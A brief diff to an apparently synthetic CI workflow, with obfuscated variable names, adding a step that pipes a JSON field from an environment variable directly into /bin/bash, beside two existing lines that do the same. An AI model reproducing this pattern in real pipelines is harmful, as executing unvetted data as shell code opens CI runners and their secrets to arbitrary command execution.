@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$veukw305" | jq -r .sju9644 | /bin/bash
           printf '%s' "$pejf419" | jq -r .akh636 | /bin/bash
+          echo $eb6 | jq -r .ys70 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
